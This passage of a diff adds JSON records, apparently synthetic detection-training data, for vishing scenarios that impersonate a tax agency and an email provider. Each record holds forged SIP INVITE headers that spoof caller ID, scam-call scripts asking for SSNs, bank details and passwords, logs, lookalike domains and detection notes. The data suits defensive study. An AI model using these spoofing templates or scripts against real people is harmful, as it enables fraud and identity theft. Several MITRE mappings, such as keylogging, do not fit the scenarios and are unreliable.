+      "detection_method": "Correlation of SIP INVITE headers displaying trusted insurance company numbers with originating IPs outside the company's known SIP infrastructure; WHOIS checks revealing recently created domains with suspicious registrant countries; monitoring RTP streams linked to suspicious IPs; cross-checking caller IDs against telephony fraud and spam call blacklists; voice pattern analysis to detect social engineering language.",
+      "relevant_mitre_techniques": [
+        "T1589.002 - Gather Victim Identity Information: Credentials",
+        "T1598.002 - Phishing: Spearphishing via Service",
+        "T1204.002 - User Execution: Malicious File",
+        "T1071.001 - Application Layer Protocol: Web Protocols (SIP)",
+        "T1566.001 - Phishing: Spearphishing Attachment"
+      ]
+    },
+    {
+      "scenario": "Vishing attack impersonates a government tax agency by spoofing their official helpline number, using a rented VoIP service to hide the call origin, to coerce victims into divulging tax identification numbers and bank account details for supposed refund processing.",
+      "technical_data": {
+        "call_recording_metadata": {
+          "call_id": "ghi789rst456",
+          "timestamp": "2024-05-10T17:48:12Z",
+          "duration_seconds": 345,
+          "caller_id_spoofed": "+1-844-TAX-HELP",
+          "actual_call_origin_ip": "192.0.2.75",
+          "voip_gateway_ip": "198.51.102.30",
+          "sip_invite_packet": "INVITE sip:+18448294357@taxagency.gov SIP/2.0\r\nVia: SIP/2.0/UDP 198.51.102.30:5060;branch=z9hG4bK-192837465-abcdef123456\r\nFrom: \"Tax Agency Support\" <sip:support@taxagency.gov>;tag=87654321\r\nTo: <sip:+18448294357@taxagency.gov>\r\nCall-ID: ghi789rst456@198.51.102.30\r\nCSeq: 1 INVITE\r\nContact: <sip:fraudster@198.51.102.30:5060>\r\nContent-Type: application/sdp\r\nContent-Length: 150\r\n\r\nv=0\r\no=- 1585000000000 1585000000000 IN IP4 198.51.102.30\r\ns=Vishing Tax Call\r\nc=IN IP4 198.51.102.30\r\nt=0 0\r\nm=audio 49300 RTP/AVP 0\r\na=rtpmap:0 PCMU/8000",
+          "sip_response_200_ok": "SIP/2.0 200 OK\r\nVia: SIP/2.0/UDP 198.51.102.30:5060;branch=z9hG4bK-192837465-abcdef123456\r\nFrom: \"Tax Agency Support\" <sip:support@taxagency.gov>;tag=87654321\r\nTo: <sip:+18448294357@taxagency.gov>;tag=54321\r\nCall-ID: ghi789rst456@198.51.102.30\r\nCSeq: 1 INVITE\r\nContact: <sip:+18448294357@taxagency.gov>\r\nContent-Length: 0",
+          "voice_transcript_excerpt": "This is the national tax agency calling to inform you of a pending refund. We need to verify your tax ID and bank account number to expedite the payment process.",
+          "voip_gateway_logs": [
+            "May 10 17:48:12 voip-gw03 sipproxy[3456]: INVITE from 198.51.102.30 to +18448294357 allowed by ACL",
+            "May 10 17:48:19 voip-gw03 sipproxy[3456]: RTP stream established between 198.51.102.30 and 192.0.2.75",
+            "May 10 17:54:57 voip-gw03 sipproxy[3456]: Call terminated by remote party"
+          ],
+          "network_packet_capture_excerpt": [
+            "No.     Time           Source                Destination           Protocol Length Info",
+            "34567  17:48:12.210   198.51.102.30          192.0.2.75             SIP      570    INVITE sip:+18448294357@taxagency.gov SIP/2.0",
+            "34568  17:48:12.212   192.0.2.75              198.51.102.30          SIP      225    SIP/2.0 100 Trying",
+            "34569  17:48:12.370   192.0.2.75              198.51.102.30          SIP      315    SIP/2.0 180 Ringing",
+            "34570  17:48:13.100   192.0.2.75              198.51.102.30          SIP      410    SIP/2.0 200 OK",
+            "34571  17:48:13.150   198.51.102.30          192.0.2.75             ACK      200    ACK"
+          ]
+        },
+        "caller_id_spoofing_technique": "Manipulation of SIP INVITE header to display +1-844-829-4357, the official tax agency helpline, while originating from a rented VoIP hosting provider's IP (198.51.102.30) to avoid traceability.",
+        "domain_registration": {
+          "spoofed_domain": "taxagency-securegov.com",
+          "registrar": "GlobalDomain Registry",
+          "creation_date": "2024-05-05T11:30:00Z",
+          "expiration_date": "2025-05-05T11:30:00Z",
+          "registrant_country": "BR",
+          "name_servers": [
+            "ns1.globaldomain.br",
+            "ns2.globaldomain.br"
+          ],
+          "dns_records": {
+            "A": "198.51.102.30",
+            "MX": "mail.globaldomain.br"
+          }
+        },
+        "phone_number_blacklist_status": {
+          "spoofed_number": "+18448294357",
+          "listed_in": [
+            "Do Not Call Registry",
+            "Telephony Fraud Database"
+          ],
+          "reputation_score": 1
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "198.51.102.30",
+          "192.0.2.75"
+        ],
+        "spoofed_caller_id": "+1-844-TAX-HELP",
+        "domain": "taxagency-securegov.com",
+        "registrar": "GlobalDomain Registry",
+        "voip_sip_call_id": "ghi789rst456",
+        "suspicious_sip_branch": "z9hG4bK-192837465-abcdef123456",
+        "dns_ns": [
+          "ns1.globaldomain.br",
+          "ns2.globaldomain.br"
+        ]
+      },
+      "detection_method": "Detection involves SIP signaling analysis to detect caller ID spoofing by checking origin IPs against known tax agency infrastructure; WHOIS data inspection revealing recent domain registrations with suspicious geographic origin; monitoring RTP stream endpoints; integration with telephony fraud and Do Not Call registries; voice content analysis for coercive social engineering tactics.",
+      "relevant_mitre_techniques": [
+        "T1589.002 - Gather Victim Identity Information: Credentials",
+        "T1598.002 - Phishing: Spearphishing via Service",
+        "T1071.001 - Application Layer Protocol: Web Protocols (SIP)",
+        "T1204.002 - User Execution: Malicious File",
+        "T1566.001 - Phishing: Spearphishing Attachment"
+      ]
+    },
+    {
+      "scenario": "A vishing attack impersonates a government tax agency by spoofing the official helpline number and using a cloud-based VoIP service to conceal the attacker\u2019s real IP. The attacker pressures the victim to provide social security number and banking details to avoid legal penalties.",
+      "technical_data": {
+        "call_recording_metadata": {
+          "call_id": "call987zyx654",
+          "timestamp": "2024-05-02T09:15:30Z",
+          "duration_seconds": 278,
+          "caller_id_spoofed": "+1-202-555-0199",
+          "actual_call_origin_ip": "192.0.2.45",
+          "voip_gateway_ip": "198.51.100.105",
+          "sip_invite_packet": "INVITE sip:+12025550199@taxagency.gov SIP/2.0\r\nVia: SIP/2.0/UDP 198.51.100.105:5060;branch=z9hG4bK-7f8a3b12c7d8e9f0\r\nFrom: \"Tax Agency Support\" <sip:support@taxagency.gov>;tag=4532176890\r\nTo: <sip:+12025550199@taxagency.gov>\r\nCall-ID: call987zyx654@198.51.100.105\r\nCSeq: 1 INVITE\r\nContact: <sip:fraudster@198.51.100.105:5060>\r\nContent-Type: application/sdp\r\nContent-Length: 152\r\n\r\nv=0\r\no=- 13974299324312345 13974299324312345 IN IP4 198.51.100.105\r\ns=Vishing Call\r\nc=IN IP4 198.51.100.105\r\nt=0 0\r\nm=audio 49200 RTP/AVP 0\r\na=rtpmap:0 PCMU/8000",
+          "sip_response_200_ok": "SIP/2.0 200 OK\r\nVia: SIP/2.0/UDP 198.51.100.105:5060;branch=z9hG4bK-7f8a3b12c7d8e9f0\r\nFrom: \"Tax Agency Support\" <sip:support@taxagency.gov>;tag=4532176890\r\nTo: <sip:+12025550199@taxagency.gov>;tag=87234\r\nCall-ID: call987zyx654@198.51.100.105\r\nCSeq: 1 INVITE\r\nContact: <sip:+12025550199@taxagency.gov>\r\nContent-Length: 0",
+          "voice_transcript_excerpt": "Good morning, this is the IRS office calling regarding discrepancies on your recent tax filings. Please provide your social security number and bank account details to avoid any penalties.",
+          "voip_gateway_logs": [
+            "May 02 09:15:30 voip-gw02 sipproxy[2233]: INVITE from 198.51.100.105 to +12025550199 allowed by ACL",
+            "May 02 09:15:35 voip-gw02 sipproxy[2233]: RTP stream established between 198.51.100.105 and 192.0.2.45",
+            "May 02 09:20:08 voip-gw02 sipproxy[2233]: Call terminated by remote party"
+          ],
+          "network_packet_capture_excerpt": [
+            "No.     Time           Source                Destination           Protocol Length Info",
+            "22345  09:15:30.001   198.51.100.105         192.0.2.45            SIP      590    INVITE sip:+12025550199@taxagency.gov SIP/2.0",
+            "22346  09:15:30.050   192.0.2.45             198.51.100.105        SIP      235    SIP/2.0 100 Trying",
+            "22347  09:15:30.200   192.0.2.45             198.51.100.105        SIP      315    SIP/2.0 180 Ringing",
+            "22348  09:15:31.000   192.0.2.45             198.51.100.105        SIP      410    SIP/2.0 200 OK",
+            "22349  09:15:31.050   198.51.100.105         192.0.2.45            ACK      205    ACK"
+          ]
+        },
+        "caller_id_spoofing_technique": "Manipulation of SIP INVITE headers to display the government helpline number +1-202-555-0199 while actual call originates from a VoIP gateway IP belonging to an anonymous cloud provider.",
+        "domain_registration": {
+          "spoofed_domain": "irs-support-secure.com",
+          "registrar": "NameCheap",
+          "creation_date": "2024-04-28T14:35:00Z",
+          "expiration_date": "2025-04-28T14:35:00Z",
+          "registrant_country": "CN",
+          "name_servers": [
+            "ns1.securehost.cn",
+            "ns2.securehost.cn"
+          ],
+          "dns_records": {
+            "A": "198.51.100.105",
+            "MX": "mail.securehost.cn"
+          }
+        },
+        "phone_number_blacklist_status": {
+          "spoofed_number": "+12025550199",
+          "listed_in": [
+            "Telephony Fraud Database",
+            "Federal Do Not Call Registry"
+          ],
+          "reputation_score": 1
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "198.51.100.105",
+          "192.0.2.45"
+        ],
+        "spoofed_caller_id": "+1-202-555-0199",
+        "domain": "irs-support-secure.com",
+        "registrar": "NameCheap",
+        "voip_sip_call_id": "call987zyx654",
+        "suspicious_sip_branch": "z9hG4bK-7f8a3b12c7d8e9f0",
+        "dns_ns": [
+          "ns1.securehost.cn",
+          "ns2.securehost.cn"
+        ]
+      },
+      "detection_method": "Analysis of SIP signaling traffic to detect caller ID spoofing when the origin IP is not associated with official government VoIP infrastructure; WHOIS checks on suspicious domains; correlation with telephony blacklists; voice pattern analysis to identify coercive social engineering tactics.",
+      "relevant_mitre_techniques": [
+        "T1589.002 - Gather Victim Identity Information: Credentials",
+        "T1598.002 - Phishing: Spearphishing via Service",
+        "T1056.001 - Input Capture: Keylogging",
+        "T1071.001 - Application Layer Protocol: Web Protocols (SIP over UDP/TCP)",
+        "T1204.002 - User Execution: Malicious File"
+      ]
+    },
+    {
+      "scenario": "An attacker uses a vishing campaign targeting personal email users by spoofing a major email provider\u2019s support number. The attacker uses a compromised VoIP provider to relay calls and extract login credentials under the pretense of a security breach.",
+      "technical_data": {
+        "call_recording_metadata": {
+          "call_id": "vx345plm6789",
+          "timestamp": "2024-05-18T18:42:11Z",
+          "duration_seconds": 345,
+          "caller_id_spoofed": "+1-415-555-7777",
+          "actual_call_origin_ip": "198.51.100.210",
+          "voip_gateway_ip": "203.0.113.88",
+          "sip_invite_packet": "INVITE sip:+14155557777@emailprovider.com SIP/2.0\r\nVia: SIP/2.0/UDP 203.0.113.88:5060;branch=z9hG4bK-1a2b3c4d5e6f7g8h9\r\nFrom: \"Email Support\" <sip:support@emailprovider.com>;tag=987654321\r\nTo: <sip:+14155557777@emailprovider.com>\r\nCall-ID: vx345plm6789@203.0.113.88\r\nCSeq: 1 INVITE\r\nContact: <sip:phisher@203.0.113.88:5060>\r\nContent-Type: application/sdp\r\nContent-Length: 150\r\n\r\nv=0\r\no=- 13999999999999999 13999999999999999 IN IP4 203.0.113.88\r\ns=Vishing Call\r\nc=IN IP4 203.0.113.88\r\nt=0 0\r\nm=audio 49320 RTP/AVP 0\r\na=rtpmap:0 PCMU/8000",
+          "sip_response_200_ok": "SIP/2.0 200 OK\r\nVia: SIP/2.0/UDP 203.0.113.88:5060;branch=z9hG4bK-1a2b3c4d5e6f7g8h9\r\nFrom: \"Email Support\" <sip:support@emailprovider.com>;tag=987654321\r\nTo: <sip:+14155557777@emailprovider.com>;tag=12345\r\nCall-ID: vx345plm6789@203.0.113.88\r\nCSeq: 1 INVITE\r\nContact: <sip:+14155557777@emailprovider.com>\r\nContent-Length: 0",
+          "voice_transcript_excerpt": "Hello, this is Email Support. We detected suspicious activity on your account. Please provide your full email address and password to secure your account immediately.",
+          "voip_gateway_logs": [
+            "May 18 18:42:11 voip-gw03 sipproxy[3344]: INVITE from 203.0.113.88 to +14155557777 allowed by ACL",
+            "May 18 18:42:18 voip-gw03 sipproxy[3344]: RTP stream established between 203.0.113.88 and 198.51.100.210",
+            "May 18 18:47:16 voip-gw03 sipproxy[3344]: Call terminated by remote party"
+          ],
+          "network_packet_capture_excerpt": [
+            "No.     Time           Source                Destination           Protocol Length Info",
+            "32345  18:42:11.100   203.0.113.88           198.51.100.210        SIP      600    INVITE sip:+14155557777@emailprovider.com SIP/2.0",
+            "32346  18:42:11.150   198.51.100.210         203.0.113.88          SIP      245    SIP/2.0 100 Trying",
+            "32347  18:42:11.350   198.51.100.210         203.0.113.88          SIP      330    SIP/2.0 180 Ringing",
+            "32348  18:42:12.100   198.51.100.210         203.0.113.88          SIP      420    SIP/2.0 200 OK",
+            "32349  18:42:12.150   203.0.113.88           198.51.100.210        ACK      210    ACK"
+          ]
+        },
+        "caller_id_spoofing_technique": "SIP INVITE header forged to show the legitimate customer support number +1-415-555-7777 while originating from a compromised VoIP gateway IP not registered to the email provider.",
+        "domain_registration": {
+          "spoofed_domain": "emailprovider-helpdesk.com",
+          "registrar": "GoDaddy",
+          "creation_date": "2024-05-10T12:00:00Z",
+          "expiration_date": "2025-05-10T12:00:00Z",
+          "registrant_country": "BR",
+          "name_servers": [
+            "ns1.fakecloud.br",
+            "ns2.fakecloud.br"
+          ],
+          "dns_records": {
+            "A": "203.0.113.88",
+            "MX": "mail.fakecloud.br"
+          }
+        },
+        "phone_number_blacklist_status": {
+          "spoofed_number": "+14155557777",
+          "listed_in": [
+            "Telephony Fraud Database"
+          ],
+          "reputation_score": 3
+        }
+      },
+      "indicators": {
+        "ip_addresses": [
+          "203.0.113.88",
+          "198.51.100.210"
+        ],
+        "spoofed_caller_id": "+1-415-555-7777",
+        "domain": "emailprovider-helpdesk.com",
+        "registrar": "GoDaddy",
+        "voip_sip_call_id": "vx345plm6789",
+        "suspicious_sip_branch": "z9hG4bK-1a2b3c4d5e6f7g8h9",
+        "dns_ns": [
+          "ns1.fakecloud.br",
+          "ns2.fakecloud.br"
+        ]
+      },
+      "detection_method": "Correlation of SIP call origin IPs with known legitimate email provider infrastructure; cross-checking domains with WHOIS and detecting recent suspicious registrations; blacklisting of spoofed numbers involved in telephony fraud; behavioral analysis of voice patterns for social engineering.",
+      "relevant_mitre_techniques": [
+        "T1589.002 - Gather Victim Identity Information: Credentials",
+        "T1598.002 - Phishing: Spearphishing via Service",
+        "T1056.001 - Input Capture: Keylogging",
+        "T1071.001 - Application Layer Protocol: Web Protocols (SIP)",
+        "T1204.002 - User Execution: Malicious File"
+      ]
+    }
+  ]
+}
